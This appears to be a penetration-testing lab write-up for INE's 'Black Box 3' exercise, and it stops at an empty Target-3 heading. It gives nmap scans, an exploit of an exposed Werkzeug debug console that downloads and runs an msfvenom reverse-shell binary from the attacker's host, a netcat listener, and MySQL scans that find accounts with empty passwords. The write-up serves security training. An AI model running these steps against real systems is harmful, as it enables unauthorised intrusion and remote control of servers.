---
description: >-
  Fingerprint an app and identify its vulnerabilities. Perform enumeration
  attacks to find weaknesses in the provided applications and perform privilege
  escalation.
---

# Black Box 3 - Remastered

{% hint style="info" %}
Targets: server1.ine.local, server2.ine.local and server3.ine.local
{% endhint %}

### Fingerprinting:

Mapping the Network:

```
fping -a -g 192.68.180.0/24  2>/dev/null 
192.68.180.1
192.68.180.2 ->Me
192.68.180.3 ->server1.ine.local
192.68.180.4 ->server2.ine.local
192.68.180.5 ->server3.ine.local
```

The Entire Network:

```
root@INE:~# sudo nmap -Pn -sV -O -A -T4 -p- --open -iL ip_list.txt 

Nmap scan report for target-1 (192.68.180.3)
Host is up (0.000014s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Werkzeug httpd 0.9.6 (Python 2.7.13)
|_http-server-header: Werkzeug/0.9.6 Python/2.7.13
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
MAC Address: 02:42:C0:44:B4:03 (Unknown)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.6
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.01 ms target-1 (192.68.180.3)

Nmap scan report for target-2 (192.68.180.4)
Host is up (0.000011s latency).
Not shown: 65534 closed ports
PORT     STATE SERVICE VERSION
3306/tcp open  mysql   MySQL 5.5.62-0ubuntu0.14.04.1
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.62-0ubuntu0.14.04.1
|   Thread ID: 45
|   Capabilities flags: 63487
|   Some Capabilities: DontAllowDatabaseTableColumn, IgnoreSpaceBeforeParenthesis, Speaks41ProtocolOld, SupportsTransactions, Support41Auth, FoundRows, Speaks41ProtocolNew, InteractiveClient, LongPassword, ODBCClient, IgnoreSigpipes, LongColumnFlag, ConnectWithDatabase, SupportsLoadDataLocal, SupportsCompression, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: JAEwH@G'+ADp)yH<52;o
|_  Auth Plugin Name: mysql_native_password
MAC Address: 02:42:C0:44:B4:04 (Unknown)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.6
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.01 ms target-2 (192.68.180.4)

Nmap scan report for target-3 (192.68.180.5)
Host is up (0.000011s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e1:c9:8e:a0:ca:07:1d:e9:65:06:f2:8e:cd:51:fa:76 (RSA)
|   256 82:26:cc:66:66:5b:29:7a:82:85:95:c2:43:a0:d4:6a (ECDSA)
|_  256 a9:85:9f:da:86:52:af:8d:ca:43:39:89:fa:9c:59:11 (ED25519)
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
| http-methods: 
|_  Potentially risky methods: PUT DELETE
|_http-server-header: 
|_http-title: Site doesn't have a title (text/html).
MAC Address: 02:42:C0:44:B4:05 (Unknown)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.6
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.01 ms target-3 (192.68.180.5)
```

### Target-1 (Python werkzeug):

found a console so I used this to connect to back to my machine which runs SimpleHTTPServer

```
My Machine:
1-msfvenom -p linux/x64/shell_reverse_tcp lhost=192.68.180.2 lport=53 -f elf -o rev53
2-python SimpleHTTPServer 9090

target (192.68.180.3/console):
import urllib2

filedata = urllib2.urlopen('192.68.180.2:9090/rev53')
datatowrite = filedata.read()
 
with open('/rev53', 'wb') as f:
    f.write(datatowrite)
```

now after the reverse shell is received close simple http server and start a nc listener while executing the rev53:

```
Target:
>> import commands
>> commands.getstatusoutput('chmod +x rev53')
>> commands.getstatusoutput('./rev53')

Me:
nc -lvp 53
bash -i
```

Now I have a reverse shell.

if you want to have a meterpreter start a metasploit multi/handler then use `post(multi/manage/shell_to_meterpreter) >` go thru the whole thing and now you have a meterpreter shell.



### Target-2(MySQL):

Enum the DB:

```
nmap -sV -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 192.68.180.4
Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-02 18:12 IST
Nmap scan report for target-2 (192.68.180.4)
Host is up (0.000061s latency).

PORT     STATE SERVICE VERSION
3306/tcp open  mysql   MySQL 5.5.62-0ubuntu0.14.04.1
| mysql-enum: 
|   Valid usernames: 
|     root:<empty> - Valid credentials
|     netadmin:<empty> - Valid credentials
|     guest:<empty> - Valid credentials
|     user:<empty> - Valid credentials
|     web:<empty> - Valid credentials
|     sysadmin:<empty> - Valid credentials
|     administrator:<empty> - Valid credentials
|     webadmin:<empty> - Valid credentials
|     admin:<empty> - Valid credentials
|     test:<empty> - Valid credentials
|_  Statistics: Performed 10 guesses in 1 seconds, average tps: 10.0
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.62-0ubuntu0.14.04.1
|   Thread ID: 1066
|   Capabilities flags: 63487
|   Some Capabilities: ConnectWithDatabase, Support41Auth, DontAllowDatabaseTableColumn, IgnoreSigpipes, Speaks41ProtocolNew, LongPassword, SupportsLoadDataLocal, SupportsTransactions, FoundRows, Speaks41ProtocolOld, IgnoreSpaceBeforeParenthesis, InteractiveClient, SupportsCompression, ODBCClient, LongColumnFlag, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: 9k5bn&lplP,**7tcuB(?
|_  Auth Plugin Name: mysql_native_password
MAC Address: 02:42:C0:44:B4:04 (Unknown)
```



### Target-3(Apache+SSH):

